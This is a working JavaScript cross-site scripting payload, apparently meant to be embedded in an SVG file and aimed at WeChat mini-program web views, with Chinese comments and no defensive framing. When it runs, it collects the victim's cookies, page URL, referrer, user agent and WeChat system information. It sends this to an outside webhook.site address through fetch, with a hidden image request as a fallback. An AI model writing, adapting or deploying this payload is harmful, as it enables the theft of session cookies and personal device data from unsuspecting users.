svg.script:

// 小程序环境检测和数据收集
function collectMiniProgramInfo() {
  var info = {
    type: 'miniprogram_xss',
    timestamp: new Date().getTime(),
    userAgent: navigator.userAgent || 'unknown',
    url: location.href || 'unknown',
    referrer: document.referrer || 'unknown',
    cookie: document.cookie || 'no_cookie',
    // 小程序特有信息
    wxVersion: window.wx ? 'wx_available' : 'no_wx',
    platform: navigator.platform || 'unknown',
    language: navigator.language || 'unknown'
  };

  // 尝试获取小程序特有的信息
  try {
    if (window.wx && window.wx.getSystemInfo) {
      window.wx.getSystemInfo({
        success: function(res) {
          info.systemInfo = res;
          sendData(info);
        },
        fail: function() {
          sendData(info);
        }
      });
    } else {
      sendData(info);
    }
  } catch(e) {
    info.error = e.message;
    sendData(info);
  }
}

function sendData(data) {
  var webhookUrl = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829';

  // 方法1: 使用fetch (如果支持)
  try {
    if (typeof fetch !== 'undefined') {
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      }).catch(function() {
        // 如果fetch失败，使用图片请求
        fallbackImageRequest(data);
      });
    } else {
      fallbackImageRequest(data);
    }
  } catch(e) {
    fallbackImageRequest(data);
  }
}

function fallbackImageRequest(data) {
  // 方法2: 使用图片请求作为备用方案
  var img = new Image();
  var params = [];
  for (var key in data) {
    if (data.hasOwnProperty(key)) {
      params.push(key + '=' + encodeURIComponent(JSON.stringify(data[key])));
    }
  }
  img.src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?' + params.join('&');
}

// 延迟执行以确保环境加载完成
setTimeout(collectMiniProgramInfo, 500);
